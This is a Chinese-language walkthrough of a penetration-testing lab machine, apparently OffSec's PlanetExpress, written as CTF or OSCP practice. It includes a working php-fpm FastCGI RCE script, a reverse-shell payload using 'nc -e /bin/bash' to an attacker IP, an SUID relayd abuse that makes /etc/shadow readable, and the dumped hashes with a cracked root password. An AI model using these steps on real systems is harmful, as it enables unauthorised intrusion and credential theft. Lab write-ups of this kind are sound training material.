首先用 nmap 掃
```bash
nmap -A -sV -T4 192.168.185.205
```
```json
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-13 19:06 CST
Nmap scan report for 192.168.185.205
Host is up (0.35s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-generator: Pico CMS
|_http-title: PlanetExpress - Coming Soon !
|_http-server-header: Apache/2.4.38 (Debian)
9000/tcp open  cslistener?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.59 seconds
```

發現有 web，先用 dirsearch 掃描
```bash
dirsearch -u http://192.168.185.205 -e *
```
```json

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: findsocket | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/ouyang/.dirsearch/reports/192.168.185.205/_23-07-13_19-26-46.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-07-13_19-26-46.log

Target: http://192.168.185.205/

[19:26:47] Starting:
[19:26:56] 200 -  111B  - /.gitignore
[19:26:57] 403 -  280B  - /.ht_wsr.txt
[19:26:57] 403 -  280B  - /.htaccess.bak1
[19:26:57] 403 -  280B  - /.htaccess.orig
[19:26:57] 403 -  280B  - /.htaccess.sample
[19:26:57] 403 -  280B  - /.htaccess.save
[19:26:57] 403 -  280B  - /.htaccess_sc
[19:26:57] 403 -  280B  - /.htaccess_extra
[19:26:57] 403 -  280B  - /.htaccessBAK
[19:26:57] 403 -  280B  - /.htaccess_orig
[19:26:57] 403 -  280B  - /.htaccessOLD
[19:26:57] 403 -  280B  - /.htaccessOLD2
[19:26:57] 403 -  280B  - /.htm
[19:26:57] 403 -  280B  - /.html
[19:26:57] 403 -  280B  - /.htpasswd_test
[19:26:57] 403 -  280B  - /.htpasswds
[19:26:57] 403 -  280B  - /.httr-oauth
[19:27:38] 301 -  319B  - /assets  ->  http://192.168.185.205/assets/
[19:27:38] 403 -  280B  - /assets/
[19:27:46] 301 -  319B  - /config  ->  http://192.168.185.205/config/
[19:27:46] 403 -  280B  - /config/
[19:27:47] 301 -  320B  - /content  ->  http://192.168.185.205/content/
[19:27:47] 403 -  280B  - /content/
[19:28:02] 200 -    5KB - /index.php
[19:28:02] 200 -    5KB - /index.php/login/
[19:28:27] 301 -  320B  - /plugins  ->  http://192.168.185.205/plugins/
[19:28:28] 403 -  280B  - /plugins/
[19:28:33] 403 -  280B  - /server-status
[19:28:33] 403 -  280B  - /server-status/
[19:28:41] 301 -  319B  - /themes  ->  http://192.168.185.205/themes/
[19:28:41] 403 -  280B  - /themes/
[19:28:45] 200 -    0B  - /vendor/autoload.php
[19:28:45] 200 -    0B  - /vendor/composer/autoload_classmap.php
[19:28:45] 403 -  280B  - /vendor/
[19:28:45] 200 -    0B  - /vendor/composer/autoload_files.php
[19:28:45] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[19:28:45] 200 -    0B  - /vendor/composer/autoload_psr4.php
[19:28:45] 200 -    0B  - /vendor/composer/autoload_real.php
[19:28:45] 200 -    0B  - /vendor/composer/ClassLoader.php
[19:28:45] 200 -    0B  - /vendor/composer/autoload_static.php
[19:28:45] 200 -    1KB - /vendor/composer/LICENSE
[19:28:45] 200 -   23KB - /vendor/composer/installed.json

Task Completed
```

<!--重連 VPN，IP 換成 192.168.180.205-->

繼續 Dirsearch 
```bash
dirsearch -u http://192.168.180.205/plugins -e *
```
```json
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: 51193.py | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/ouyang/.dirsearch/reports/192.168.180.205/-plugins_23-07-16_15-11-49.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-07-16_15-11-49.log

Target: http://192.168.180.205/plugins/

[15:11:50] Starting:
[15:12:00] 200 -   68B  - /plugins/.gitignore
[15:12:01] 403 -  280B  - /plugins/.ht_wsr.txt
[15:12:01] 403 -  280B  - /plugins/.htaccess.bak1
[15:12:01] 403 -  280B  - /plugins/.htaccess.orig
[15:12:01] 403 -  280B  - /plugins/.htaccessOLD
[15:12:01] 403 -  280B  - /plugins/.htaccess_sc
[15:12:01] 403 -  280B  - /plugins/.htaccessOLD2
[15:12:01] 403 -  280B  - /plugins/.htaccess.save
[15:12:01] 403 -  280B  - /plugins/.htaccess_orig
[15:12:01] 403 -  280B  - /plugins/.htm
[15:12:01] 403 -  280B  - /plugins/.htaccess_extra
[15:12:01] 403 -  280B  - /plugins/.htaccessBAK
[15:12:01] 403 -  280B  - /plugins/.htaccess.sample
[15:12:02] 403 -  280B  - /plugins/.htpasswds
[15:12:02] 403 -  280B  - /plugins/.htpasswd_test
[15:12:02] 403 -  280B  - /plugins/.html
[15:12:02] 403 -  280B  - /plugins/.httr-oauth

Task Completed
```
http://192.168.180.205/config/config.yml
```json
##
# Basic
#
site_title: PlanetExpress
base_url: ~

rewrite_url: ~
debug: true
timezone: ~
locale: ~

##
# Theme
#
theme: launch
themes_url: ~

theme_config:
    widescreen: false
twig_config:
    autoescape: html
    strict_variables: false
    charset: utf-8
    debug: ~
    cache: false
    auto_reload: true

##
# Content
#
date_format: %D %T
pages_order_by_meta: planetexpress 

pages_order_by: alpha
pages_order: asc
content_dir: ~
content_ext: .md
content_config:
    extra: true
    breaks: false
    escape: false
    auto_urls: true
assets_dir: assets/
assets_url: ~

##
# Plugins: https://github.com/picocms/Pico/tree/master/plugins
#
plugins_url: ~
DummyPlugin.enabled: false

PicoOutput:
  formats: [content, raw, json]

## 
# Self developed plugin for PlanetExpress
#
#PicoTest:
#  enabled: true 

```

9000 port 有執行 cslistener，查了一下發現可能是執行 php-fpm (PHP FastCGI Process Manager)[askubuntu](https://askubuntu.com/questions/176613/what-is-cslistener)
接著 google [FastCGI hacking tricks](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi)
使用此 payload 執行 RCE
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"

FILENAMES="/var/www/html/planetexpress/plugins/PicoTest.php" # Exisiting file path

HOST=$1

B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do

OUTPUT=$(mktemp)

env -i \

PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \

SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \

cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

cat $OUTPUT

done
```
FILENAMES 需使用實際路徑，透過 [http://192.168.180.205/plugins/PicoTest.php](http://192.168.180.205/plugins/PicoTest.php) 觀察到 script filename 為 /var/www/html/planetexpress/plugins/PicoTest.php
亦透過此檔案發現 system 等指令被 disable
![[Pasted image 20230716152832.png]]
故參考此頁面，將 system 換成 passthru [PHP Useful Functions](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass)
可成功 RCE，再修改 payload，透過 nc 連回 kali，但 port 需要改成 80 (原本掃到的 web port)
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; passthru('nc 192.168.45.241 80 -e /bin/bash'); echo '-->';"
FILENAMES="/var/www/html/planetexpress/plugins/PicoTest.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```
另一邊透過 nc 監聽，可成功 get shell
```bash
nc -nvlp 80
```

## 提權

<!--重連 VPN，IP 換成 192.168.167.205-->

先找所有有 SUID 權限的檔案
```bash
find / -perm -4000 2>/dev/null
```
```json
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/relayd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

查看 /etc/passwd & /etc/shadow 權限
```bash
ls -l /etc/passwd /etc/shadow
```
```json
-rw-r--r-- 1 root root   1385 Jan 10  2022 /etc/passwd
-rw-r----- 1 root shadow  940 Jan 10  2022 /etc/shadow
```

透過 relayd 修改權限
```bash
/usr/sbin/relayd -C /etc/shadow
```
```json
[ERR] 2023-07-17 10:15:19 config.cpp:1539 write
[ERR] 2023-07-17 10:15:19 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2023-07-17 10:15:19 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2023-07-17 10:15:19 invalid config file
```

接著查看 /etc/shadow 權限
```bash
ls -l /etc/shadow
```
```json
-rw-r--r-- 1 root shadow  940 Jan 10  2022 /etc/shadow
```

查看 /etc/shadow
```bash
cat /etc/shadow
```
```json
root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
daemon:*:18555:0:99999:7:::
bin:*:18555:0:99999:7:::
sys:*:18555:0:99999:7:::
sync:*:18555:0:99999:7:::
games:*:18555:0:99999:7:::
man:*:18555:0:99999:7:::
lp:*:18555:0:99999:7:::
mail:*:18555:0:99999:7:::
news:*:18555:0:99999:7:::
uucp:*:18555:0:99999:7:::
proxy:*:18555:0:99999:7:::
www-data:*:18555:0:99999:7:::
backup:*:18555:0:99999:7:::
list:*:18555:0:99999:7:::
irc:*:18555:0:99999:7:::
gnats:*:18555:0:99999:7:::
nobody:*:18555:0:99999:7:::
_apt:*:18555:0:99999:7:::
systemd-timesync:*:18555:0:99999:7:::
systemd-network:*:18555:0:99999:7:::
systemd-resolve:*:18555:0:99999:7:::
messagebus:*:18555:0:99999:7:::
sshd:*:18555:0:99999:7:::
systemd-coredump:!!:18555::::::
astro:$6$3c/stP2hxnireZRa$8Byaa52GnSq5BEVJtCrh2ZAKNSzYRvFuDEb2q2jk8hsJH91qQ6zgtUCxAZ.NgssBCJ7I8DURme/kd7MSkNl5f/:19003:0:99999:7:::
```

接著破解 root 密碼
```bash
hashcat -m 1800 ~/offensive-security/OSCP/PG/PlanetExpress/hashes /usr/share/wordlists/rockyou.txt -a 0
```
```json
$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:neverwant2saygoodbye
```

```bash
www-data@planetexpress:~/html/planetexpress/plugins$ su root
su root
Password: neverwant2saygoodbye

root@planetexpress:/var/www/html/planetexpress/plugins# cd
scd
root@planetexpress:~#ls
ls
proof.txt
root@planetexpress:~# cat proof.txt
cat proof.txt
670c9112b5463ad3903dd5694adf1388
```

Got proof.txt!